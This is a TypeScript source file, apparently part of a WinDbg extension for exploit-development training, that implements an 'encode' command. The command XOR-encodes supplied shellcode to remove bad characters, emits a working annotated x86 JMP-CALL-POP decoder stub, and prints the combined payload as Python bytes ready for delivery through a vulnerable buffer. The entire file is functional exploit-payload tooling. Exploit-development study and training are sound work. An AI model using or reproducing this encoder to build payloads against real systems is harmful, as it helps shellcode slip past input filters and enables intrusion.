import { Command, CommandResult } from "../core/registry";
import * as out from "../core/output";
import { normalizeByteArray } from "../core/validation";

// Short XOR decoder stub (21 bytes) — payloadLen 1–255:
//   0:  EB 0E          JMP SHORT to CALL at 16
//   2:  5E             POP ESI           ← decode_loop
//   3:  31 C9          XOR ECX, ECX
//   5:  B1 <lo>        MOV CL, lo
//   7:  80 36 <key>    XOR [ESI], key    ← xor_byte
//   10: 46             INC ESI
//   11: E2 FA          LOOP xor_byte     (next_ip=13, -6 → 7 ✓)
//   13: EB 06          JMP SHORT 21      (execute ✓)
//   15: 90             NOP
//   16: E8 ED FF FF FF CALL decode_loop  (next_ip=21, -19 → 2 ✓)
//   21: <encoded payload>
//
// Long XOR decoder stub (23 bytes) — payloadLen 256–65535:
//   0:  EB 10          JMP SHORT to CALL at 18
//   2:  5E             POP ESI           ← decode_loop
//   3:  31 C9          XOR ECX, ECX
//   5:  B5 <hi>        MOV CH, hi
//   7:  B1 <lo>        MOV CL, lo
//   9:  80 36 <key>    XOR [ESI], key    ← xor_byte
//   12: 46             INC ESI
//   13: E2 FA          LOOP xor_byte     (next_ip=15, -6 → 9 ✓)
//   15: EB 06          JMP SHORT 23      (execute ✓)
//   17: 90             NOP
//   18: E8 EB FF FF FF CALL decode_loop  (next_ip=23, -21 → 2 ✓)
//   23: <encoded payload>
//
// Both stubs avoid 0x00, 0x0A, 0x0D in fixed-byte positions.

const MAX_SHELLCODE_LEN = 65535;

export function buildXorStub(key: number, payloadLen: number): number[] {
  const k = key & 0xff;
  if (payloadLen <= 255) {
    return [
      0xeb, 0x0e,              // JMP SHORT to CALL (16)
      0x5e,                    // POP ESI
      0x31, 0xc9,              // XOR ECX, ECX
      0xb1, payloadLen,        // MOV CL, lo
      0x80, 0x36, k,           // XOR [ESI], key
      0x46,                    // INC ESI
      0xe2, 0xfa,              // LOOP xor_byte
      0xeb, 0x06,              // JMP SHORT execute
      0x90,                    // NOP
      0xe8, 0xed, 0xff, 0xff, 0xff, // CALL decode_loop
    ];
  }
  const lo = payloadLen & 0xff;
  const hi = (payloadLen >> 8) & 0xff;
  return [
    0xeb, 0x10,                // JMP SHORT to CALL (18)
    0x5e,                      // POP ESI
    0x31, 0xc9,                // XOR ECX, ECX
    0xb5, hi,                  // MOV CH, hi
    0xb1, lo,                  // MOV CL, lo
    0x80, 0x36, k,             // XOR [ESI], key
    0x46,                      // INC ESI
    0xe2, 0xfa,                // LOOP xor_byte
    0xeb, 0x06,                // JMP SHORT execute
    0x90,                      // NOP
    0xe8, 0xeb, 0xff, 0xff, 0xff, // CALL decode_loop
  ];
}

export function xorEncode(shellcode: number[], key: number): number[] {
  return shellcode.map((b) => (b ^ key) & 0xff);
}

export function findXorKey(shellcode: number[], exclude: Set<number>, hint?: number): number | undefined {
  const candidates = hint !== undefined ? [hint & 0xff] : Array.from({ length: 255 }, (_, i) => i + 1);
  for (const key of candidates) {
    if (key === 0 || exclude.has(key)) continue;
    if (xorEncode(shellcode, key).every((b) => !exclude.has(b))) return key;
  }
  return undefined;
}

export function parseShellcodeHex(raw: unknown): number[] {
  if (Array.isArray(raw)) {
    return (raw as number[]).map((b) => b & 0xff);
  }
  if (typeof raw !== "string" || !raw.trim()) {
    throw new Error("shellcode must be a non-empty hex string or byte array.");
  }
  const hex = raw.replace(/[^0-9a-fA-F]/g, "");
  if (hex.length % 2 !== 0) {
    throw new Error("shellcode hex string must have an even number of hex digits.");
  }
  const result: number[] = [];
  for (let i = 0; i < hex.length; i += 2) {
    result.push(parseInt(hex.slice(i, i + 2), 16));
  }
  return result;
}

function toPython(bytes: number[]): string {
  return `b"${bytes.map((b) => `\\x${b.toString(16).padStart(2, "0")}`).join("")}"`;
}

function toHex(bytes: number[]): string {
  return bytes.map((b) => b.toString(16).toUpperCase().padStart(2, "0")).join(" ");
}

export function createEncodeCommand(): Command {
  return {
    name: "encode",
    description: "XOR-encode shellcode to eliminate bad characters.",
    usage: `dx @$osed().encode({ shellcode: "fc e8 82 00 00 00 60...", exclude: [0, 10, 13] })`,
    examples: [
      `dx @$osed().encode({ shellcode: "fc e8 82 00 00 00 60...", exclude: [0x00, 0x0a, 0x0d] })`,
      `dx @$osed().encode({ shellcode: "fc e8...", exclude: [0, 10, 13], key: 0x41 })`,
    ],
    schema: {
      shellcode: { type: "string", required: true },
      exclude: { type: "array", elementType: "number", default: [0, 10, 13] },
      key: { type: "number" },
    },
    execute(options: Record<string, unknown>): CommandResult {
      const shellcode = parseShellcodeHex(options.shellcode);
      const normalizedExclude = normalizeByteArray((options.exclude as number[] | undefined) ?? [0, 10, 13]);
      const exclude = new Set<number>(normalizedExclude.values);
      const keyHint = options.key !== undefined ? (options.key as number) & 0xff : undefined;

      const warnings: string[] = [];
      if (normalizedExclude.warning) warnings.push(normalizedExclude.warning);

      if (shellcode.length === 0) {
        throw new Error("shellcode is empty.");
      }
      if (shellcode.length > MAX_SHELLCODE_LEN) {
        throw new Error(
          `Shellcode is ${shellcode.length} bytes; maximum supported is ${MAX_SHELLCODE_LEN}. ` +
            `Use msfvenom --encoder x86/xor_dynamic for very large payloads.`,
        );
      }

      const key = findXorKey(shellcode, exclude, keyHint);
      if (key === undefined) {
        throw new Error(
          keyHint !== undefined
            ? `Key 0x${keyHint.toString(16).toUpperCase().padStart(2, "0")} produces bad characters in the encoded output.`
            : `No XOR key in 0x01..0xFF eliminates all bad characters. Consider a different encoder or revising the bad character list.`,
        );
      }

      const encoded = xorEncode(shellcode, key);
      const stub = buildXorStub(key, shellcode.length);
      const combined = [...stub, ...encoded];

      const badStubBytes = stub
        .map((b, i) => ({ b, i }))
        .filter(({ b }) => exclude.has(b));

      if (badStubBytes.length > 0) {
        const detail = badStubBytes
          .map(({ b, i }) => `0x${b.toString(16).toUpperCase().padStart(2, "0")} at stub[${i}]`)
          .join(", ");
        warnings.push(
          `Decoder stub contains bad byte(s): ${detail}. ` +
            `The stub will be corrupted when delivered through the vulnerable buffer.`,
        );
      }

      out.section("XOR Encoder");
      out.info(`Key:              0x${key.toString(16).toUpperCase().padStart(2, "0")}`);
      out.info(`Shellcode length: ${shellcode.length} bytes`);
      out.info(`Stub size:        ${stub.length} bytes`);
      out.info(`Total payload:    ${combined.length} bytes`);

      out.section("Decoder Stub (hex)");
      out.print(toHex(stub));

      out.section("Encoded Shellcode (hex)");
      out.print(toHex(encoded));

      out.section("Combined Payload (Python)");
      out.print(toPython(combined));

      if (warnings.length > 0) {
        out.section("Warnings");
        for (const warning of warnings) {
          out.warn(warning);
        }
      }

      out.whyItMatters("XOR encoding transforms each shellcode byte to avoid characters that corrupt the delivery buffer.");

      return {
        command: "encode",
        args: options,
        success: true,
        findings: [
          {
            key,
            keyHex: `0x${key.toString(16).toUpperCase().padStart(2, "0")}`,
            stubSize: stub.length,
            encodedSize: encoded.length,
            totalSize: combined.length,
            stub,
            encoded,
            combined,
          },
        ],
        warnings,
        errors: [],
      };
    },
  };
}
